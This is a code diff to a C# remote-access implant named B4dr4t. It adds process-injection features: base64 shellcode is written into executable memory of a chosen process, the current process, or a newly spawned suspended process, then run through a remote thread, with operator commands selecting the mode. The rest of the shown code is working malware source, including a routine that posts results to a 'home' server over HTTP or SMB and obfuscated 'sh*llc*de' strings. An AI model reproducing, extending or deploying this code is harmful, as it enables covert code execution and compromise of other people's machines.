@@ -165,12 +165,63 @@ namespace B4dr4t
         public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
         int dwSize, uint flNewProtect, out uint lpflOldProtect);
 
+        public enum ProcessAccessRights
+        {
+            All = 0x001F0FFF,
+            Terminate = 0x00000001,
+            CreateThread = 0x00000002,
+            VirtualMemoryOperation = 0x00000008,
+            VirtualMemoryRead = 0x00000010,
+            VirtualMemoryWrite = 0x00000020,
+            DuplicateHandle = 0x00000040,
+            CreateProcess = 0x000000080,
+            SetQuota = 0x00000100,
+            SetInformation = 0x00000200,
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x00001000,
+            Synchronize = 0x00100000
+        }
+        public enum MemAllocation
+        {
+            MEM_COMMIT = 0x00001000,
+            MEM_RESERVE = 0x00002000,
+            MEM_RESET = 0x00080000,
+            MEM_RESET_UNDO = 0x1000000,
+            SecCommit = 0x08000000
+        }
+        public enum MemProtect
+        {
+            PAGE_EXECUTE = 0x10,
+            PAGE_EXECUTE_READ = 0x20,
+            PAGE_EXECUTE_READWRITE = 0x40,
+            PAGE_EXECUTE_WRITECOPY = 0x80,
+            PAGE_NOACCESS = 0x01,
+            PAGE_READONLY = 0x02,
+            PAGE_READWRITE = 0x04,
+            PAGE_WRITECOPY = 0x08,
+            PAGE_TARGETS_INVALID = 0x40000000,
+            PAGE_TARGETS_NO_UPDATE = 0x40000000,
+        }
+
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hObject);
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+
         public static class Globl
         {
             public static string[] HOME = new string[1];
         }
-
-        // By passing in the same Powershell object we share the same Powershell workspace as standard cmd execution
+        
         private static byte[] Zor(byte[] input, byte[] key)
         {
             byte[] mixed = new byte[input.Length];
@@ -181,6 +232,7 @@ namespace B4dr4t
             return mixed;
         }
 
+        // By passing in the same Powershell object we share the same Powershell workspace as standard cmd execution
         private static string RunPs(string encodedScript, PowerShell ps)
         {
             string results = string.Empty;
@@ -286,14 +338,13 @@ namespace B4dr4t
             }
 
         }
-        public static string RunShc(string data)
+        public static string SShc(string data, string targ)
         {
             byte[] shcode = Convert.FromBase64String(data);
 
-            string processpath = @"C:\Windows\System32\searchprotocolhost.exe";
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            bool success = CreateProcess(processpath, null,
+            bool success = CreateProcess(targ, null,
               IntPtr.Zero, IntPtr.Zero, false,
               ProcessCreationFlags.CREATE_SUSPENDED,
               IntPtr.Zero, null, ref si, out pi);
@@ -311,6 +362,61 @@ namespace B4dr4t
             ResumeThread(ThreadHandle);
             return "[*] Wrote " + data.Length + " bytes to new process " + pi.dwProcessId;
         }
+
+        public static string IShc(string data, int pid)
+        {
+            bool pause = false;
+            byte[] buf = Convert.FromBase64String(data);
+            string retval = "";
+            if (pid == 0) // local
+            {
+                pid = System.Diagnostics.Process.GetCurrentProcess().Id;
+                pause = true;
+            }
+
+            try
+            {
+                uint lpNumberOfBytesWritten = 0;
+                uint lpThreadId = 0;
+                retval += "[*] Obtaining the handle for the process id " + pid + "\n";
+                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
+                retval += "[*] Handle opened for the process id " + pid + "\n";
+                retval += "[*] Allocating memory to inject the shellcode\n";
+                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE); // probably dont want rwx memory
+                retval += "[*] Memory for injecting shellcode allocated at 0x" + rMemAddress + "\n";
+                Console.WriteLine("[*] Writing the shellcode at the allocated memory location");
+                IntPtr hRemoteThread = IntPtr.Zero;
+                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
+                {
+                    retval += "[*] Sh*llc*de written in the process memory\n";
+                    retval += "[*] Creating remote thread to execute the sh*llc*de\n";
+                    hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
+
+                    if (pause)
+                    {
+                        retval += "[*] Waiting for thread to exit before shutting down current process\n";
+                        WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
+                    }
+
+                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
+                    retval += "[+] Sucessfully injected the shellcode into the memory of the process id " + pid + "\n";
+                }
+                else
+                {
+                    retval += "[-] Failed to write the shellcode into the memory of the process id " + pid + "\n";
+                }
+                bool hOpenProcessClose = CloseHandle(pHandle);
+
+            }
+            catch (Exception ex)
+            {
+                retval += "[-] " + Marshal.GetExceptionCode() + "\n";
+                retval += ex.Message + "\n";
+            }
+            retval += "[*] Finished!\n";
+            return retval;   
+        }
+
         public static string Post(string home, string resp, HttpClient client) // handles HTTP and SMB post
         {
             string json = null;
@@ -454,11 +560,24 @@ namespace B4dr4t
                                     try
                                     {
                                         string code = cmnd.Split(' ')[1];
-                                        retval = RunShc(code);
+                                        string targ = cmnd.Split(' ')[2];
+                                        if(targ == "local")
+                                        {
+                                            retval = IShc(code, 0);
+                                        }
+                                        else if(int.TryParse(targ, out int opid))
+                                        {
+                                            retval = IShc(code, opid);
+                                        }
+                                        else
+                                        {
+                                            retval = SShc(code, targ);
+                                        }
+                                        
                                     }
                                     catch (Exception e)
                                     {
-                                        retval = "[!] Error occured running sh#llc#de: \n" + e;
+                                        retval = "[!] Error occured running sh#llc#de: \n" + e.Message;
                                     }
                                 }
                                 else if (cmnd.Split(' ')[0] == "dl")
